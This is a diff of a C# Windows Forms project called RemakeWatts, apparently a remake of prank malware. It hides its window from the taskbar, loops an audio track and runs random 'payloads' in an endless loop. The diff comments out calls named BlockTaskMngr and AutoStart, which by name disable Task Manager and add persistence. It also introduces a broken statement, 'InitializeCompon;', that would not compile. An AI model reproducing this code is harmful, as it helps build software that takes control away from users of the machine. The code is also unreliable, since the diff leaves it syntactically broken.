@@ -4,6 +4,7 @@ using System.Media;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Windows.Forms;
+using Payloads;
 
 namespace RemakeWatts
 {
@@ -23,20 +24,21 @@ namespace RemakeWatts
             this.StartPosition = FormStartPosition.Manual;
             this.Location = new Point(x, y);
             this.ShowInTaskbar = false;
-            InitializeComponent();
             new Thread(() =>
             {
-                SoundPlayer player = new SoundPlayer(Properties.Resources.Cypis___Putin);
+                SoundPlayer player = new SoundPlayer(Properties.Resources.Vicetone__Tony_Igy___Astronomia_2014);
                 player.PlayLooping();
             }).Start();
+            InitializeCompon;
             RandomPayload();
+            
         }
         //losowanie payloda
         public void RandomPayload()
         {
             Payload payload = new Payload();
-            payload.BlockTaskMngr();
-            payload.AutoStart();
+            //payload.BlockTaskMngr();
+            //payload.AutoStart();
             while (true)
             {
                 Random random = new Random();
